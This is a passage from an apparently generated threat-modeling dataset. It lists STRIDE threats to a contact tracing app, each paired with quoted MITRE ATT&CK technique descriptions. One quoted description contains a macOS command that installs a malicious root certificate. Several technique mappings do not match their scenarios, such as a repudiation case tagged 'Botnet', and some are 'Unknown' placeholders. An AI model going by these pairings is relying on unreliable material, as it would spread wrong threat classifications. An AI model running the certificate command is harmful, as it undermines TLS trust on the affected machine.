                "id": "attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00",
                "technique_id": "T1195.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a vulnerability to gain administrative access to the service server.",
            "Assumptions": [
                {
                    "Assumption": "The service server has known unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "When not applying security patches promptly."
                },
                {
                    "Assumption": "The attacker has a way to trigger these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Through network access or social engineering."
                },
                {
                    "Assumption": "System administrators do not regularly audit server security.",
                    "Role": "System Administrator",
                    "Condition": "When neglecting routine security audits."
                }
            ],
            "Potential Impact": "Full control of server functions, unauthorized data access, and potential manipulation of service.",
            "MITRE ATT&CK Keywords": [
                "administrative access",
                "service server exploitation",
                "privilege abuse"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "12",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake contact tracing app to collect user data and fake exposure alerts.",
            "Assumptions": [
                {
                    "Assumption": "Users rely on app stores to download the application",
                    "Role": "End Users",
                    "Condition": "Condition is valid when users download apps from unofficial sources."
                },
                {
                    "Assumption": "The application lacks sufficient verification of the user and device identities",
                    "Role": "Mobile Application Developers",
                    "Condition": "Condition is valid when app lacks strong cryptographic methods for user identity verification."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user data, potential malware infection, and compromised data integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "imitation",
                "social engineering"
            ],
            "mitre_technique": {
                "name": "Compromise Accounts",
                "description": "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).",
                "id": "attack-pattern--81033c3b-16a4-46e4-8fed-9b030dd03c4a",
                "technique_id": "T1586"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious user sends fake Bluetooth signals to trick the application into recording false proximity data.",
            "Assumptions": [
                {
                    "Assumption": "Devices rely heavily on Bluetooth signals for proximity tracking",
                    "Role": "Mobile Application Users",
                    "Condition": "Condition is valid when devices are only validating Bluetooth signals without additional checks."
                },
                {
                    "Assumption": "No robust validation of Bluetooth signals exists in the app",
                    "Role": "App Developers",
                    "Condition": "Condition is valid when the app hasn't implemented extra layers of verification for Bluetooth signals."
                }
            ],
            "Potential Impact": "False exposure notifications cause unnecessary panic and disrupt normal activities.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "signal injection",
                "Bluetooth",
                "proximity data"
            ],
            "mitre_technique": {
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses stolen credentials to impersonate a health authority and send out fake positive test results.",
            "Assumptions": [
                {
                    "Assumption": "Health authorities' credentials can be stolen",
                    "Role": "Attackers",
                    "Condition": "Condition is valid with weak or compromised credential storage and management."
                },
                {
                    "Assumption": "Lack of multi-factor authentication for health authority logins",
                    "Role": "System Administrators",
                    "Condition": "Condition is valid when logging in requires only username and password."
                }
            ],
            "Potential Impact": "False public health information dissemination leading to panic and incorrect public health measures.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential compromise",
                "identity theft",
                "public health notification"
            ],
            "mitre_technique": {
                "name": "GUI Input Capture",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
                "technique_id": "T1056.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the application code to bypass exposure notification logic and avoid detection.",
            "Assumptions": [
                {
                    "Assumption": "Users are running potentially modified versions of the app",
                    "Role": "End Users",
                    "Condition": "Condition is valid when users download apps from untrusted sources."
                },
                {
                    "Assumption": "Application code is not protected against tampering",
                    "Role": "App Developers",
                    "Condition": "Condition is valid when code lacks obfuscation and integrity checks."
                }
            ],
            "Potential Impact": "Exposure data manipulation causing critical public health response flaws.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code modification",
                "bypass logic",
                "security feature evasion"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A malicious insider in the administrative team modifies user data in the central server database.",
            "Assumptions": [
                {
                    "Assumption": "Insider has administrative access to the central server",
                    "Role": "Malicious Insider",
                    "Condition": "Condition is valid when admin credentials are poorly managed."
                },
                {
                    "Assumption": "No effective database integrity checks are in place",
                    "Role": "System Administrators",
                    "Condition": "Condition is valid when integrity verification mechanisms are inadequate or absent."
                }
            ],
            "Potential Impact": "Data integrity breach resulting in false positives or negatives in contact tracing data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "insider threat",
                "database manipulation",
                "centralized server"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies data in transit between the mobile app and server (centralized architecture).",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption",
                    "Role": "App Developers",
                    "Condition": "Condition is valid when secure communication protocols like TLS are not used."
                },
                {
                    "Assumption": "Man-in-the-middle attack vector exists",
                    "Role": "Attackers",
                    "Condition": "Condition is valid when network traffic can be intercepted and altered."
                }
            ],
            "Potential Impact": "Interception and alteration lead to integrity and confidentiality breaches.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "man-in-the-middle",
                "data interception",
                "data modification"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny having received or read exposure notifications to avoid quarantine.",
            "Assumptions": [
                {
                    "Assumption": "No logging mechanism for user interaction with notifications",
                    "Role": "App Developers",
                    "Condition": "Condition is valid when app lacks logging of notification delivery and user interaction."
                },
                {
                    "Assumption": "Notifications are not uniquely tagged",
                    "Role": "System Administrators",
                    "Condition": "Condition is valid when notifications are sent without unique identifiers for tracking."
                }
            ],
            "Potential Impact": "Repudiation of critical exposure alerts causing public health risk.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "denial",
                "audit trail missing",
                "notification tracking"
            ],
            "mitre_technique": {
                "name": "Botnet",
                "description": "Adversaries may compromise numerous third-party systems to form a botnet\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.(Citation: Imperva DDoS for Hire) Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).",
                "id": "attack-pattern--810d8072-afb6-4a56-9ee7-86379ac4a6f3",
                "technique_id": "T1584.005"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Healthcare authorities deny having sent specific critical exposure alerts.",
            "Assumptions": [
                {
                    "Assumption": "System does not log alert issuance activities",
                    "Role": "System Administrators",
                    "Condition": "Condition is valid when administrative actions are not logged."
                },
                {
                    "Assumption": "No secure communication channel for alert issuance",
                    "Role": "Health Authorities",
                    "Condition": "Condition is valid when secure channels are absent for issuing alerts."
                }
            ],
            "Potential Impact": "Unaccountability in public health measures leading to a loss of trust.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit trail missing",
                "administrative action logging",
                "secure communication"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users claim that their proximity data was falsified and deny being in certain locations.",
            "Assumptions": [
                {
                    "Assumption": "Proximity data logs lack tamper-proof measures",
                    "Role": "App Developers",
                    "Condition": "Condition is valid when logs are not protected against alterations."
                },
                {
                    "Assumption": "App does not implement geolocation verification methodologies",
                    "Role": "App Developers",
                    "Condition": "Condition is valid when only a single method is used to track proximity without cross-verifying data."
                }
            ],
            "Potential Impact": "Challenges in enforcement of quarantine and health measures; public and legal disputes.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "location falsification",
                "data logging",
                "proximity tracking"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted proximity data during transmission (decentralized architecture).",
            "Assumptions": [
                {
                    "Assumption": "Proximity data is sent over an unencrypted channel",
                    "Role": "App Developers",
                    "Condition": "Condition is valid when insecure communication protocols are used."
                },
                {
                    "Assumption": "No end-to-end encryption is implemented",
                    "Role": "System Architects",
                    "Condition": "Condition is valid in the absence of encryption measures."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive health and activity data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "unencrypted communication",
                "transmission security"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to centralized server logs revealing user interaction data and metadata.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored without adequate access controls",
                    "Role": "System Administrators",
                    "Condition": "Condition is valid when logs are easily accessible without proper authorization."
                },
                {
                    "Assumption": "Central server is vulnerable to unauthorized access",
                    "Role": "Attackers",
                    "Condition": "Condition is valid when server lacks robust access control mechanisms."
                }
            ],
            "Potential Impact": "Compromised confidentiality of user interaction data and potential misuse of metadata.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unauthorized access",
                "central server",
                "log files"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider leaks health status and proximity information of VIP users.",
            "Assumptions": [
                {
                    "Assumption": "Insider has access to sensitive health and proximity data",
                    "Role": "Insider Threat Actor",
                    "Condition": "Condition is valid with improper segregation of duties and insufficient monitoring."
                },
                {
                    "Assumption": "There are no mechanisms to detect insider threats",
                    "Role": "System Administrators",
                    "Condition": "Condition is valid when monitoring and auditing for insider threats are not implemented."
                }
            ],
            "Potential Impact": "Sensitive personal health information disclosed, leading to privacy breaches and misuse.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider threat",
                "data leakage",
                "VIP user data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Botnet powered DDoS attack targets the central server to disrupt contact tracing operations.",
            "Assumptions": [
                {
                    "Assumption": "Central server is accessible from the internet",
                    "Role": "Attackers",
                    "Condition": "Condition is valid when central server does not employ DDoS protection mechanisms."
                },
                {
                    "Assumption": "There is no rate limiting or request filtering",
                    "Role": "System Administrators",
                    "Condition": "Condition is valid when server does not implement rate limits and filtering rules."
                }
            ],
            "Potential Impact": "Disruption of contact tracing services, hampering public health responses and causing data unavailability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "availability attack",
                "central server"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Excessive exposure notifications due to a design flaw cause app crashes on user devices.",
            "Assumptions": [
                {
                    "Assumption": "App design lacks checks for notification floods",
                    "Role": "App Developers",
                    "Condition": "Condition is valid when the app does not manage or limit notification bursts."
                },
                {
                    "Assumption": "User devices have limited resource handling capabilities",
                    "Role": "End Users",
                    "Condition": "Condition is valid for devices with lower processing power and memory."
                }
            ],
            "Potential Impact": "User device unavailability causing untracked exposures and loss of service.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "notification flood",
                "app crash",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disables the Bluetooth functionality on user devices through malware, hindering proximity tracing.",
            "Assumptions": [
                {
                    "Assumption": "Users' devices are susceptible to malware infections",
                    "Role": "End Users",
                    "Condition": "Condition is valid when devices lack proper anti-malware defenses."
                },
                {
                    "Assumption": "App relies solely on Bluetooth for proximity tracing",
                    "Role": "App Developers",
                    "Condition": "Condition is valid for Bluetooth-reliant contact tracing methods."
                }
            ],
            "Potential Impact": "Prevented contact data collection, leading to untracked virus spread and data unavailability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "Bluetooth disabling",
                "malware",
                "proximity tracing"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the mobile app to escalate privileges to administrative level.",
            "Assumptions": [
                {
                    "Assumption": "App has unpatched security vulnerabilities",
                    "Role": "App Developers",
                    "Condition": "Condition is valid when app is not regularly updated and patched."
                },
                {
                    "Assumption": "Mobile devices run with excessive permissions",
                    "Role": "End Users",
                    "Condition": "Condition is valid when app permissions are not minimized."
                }
            ],
            "Potential Impact": "Complete control of the app allowing unauthorized data access and manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "administrative access",
                "app control"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A rogue application installed on the user's device elevates its privileges to affect the contact tracing app.",
            "Assumptions": [
                {
                    "Assumption": "Devices allow installation of apps from unknown sources",
                    "Role": "End Users",
                    "Condition": "Condition is valid when users bypass app store restrictions."
                },
                {
                    "Assumption": "Application sandboxing and isolation are weak",
                    "Role": "Mobile OS Developers",
                    "Condition": "Condition is valid when the operating system does not enforces strict app sandboxing."
                }
            ],
            "Potential Impact": "Rogue app compromises the contact tracing app resulting in unauthorized data access and manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "rogue application",
                "sandbox escape",
                "app interference"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to the central server via a vulnerability, extending control over the system.",
            "Assumptions": [
                {
                    "Assumption": "Central server has exploitable vulnerabilities",
                    "Role": "System Administrators",
                    "Condition": "Condition is valid when server is inadequately secured and patched."
                },
                {
                    "Assumption": "Access controls and logging mechanisms are inadequate",
                    "Role": "System Administrators",
                    "Condition": "Condition is valid when there are insufficient access logs and controls."
                }
            ],
            "Potential Impact": "Full control over the system's operations and sensitive data leading to massive data breaches and manipulations.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "server exploitation",
                "administrative access",
                "unauthorized control"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
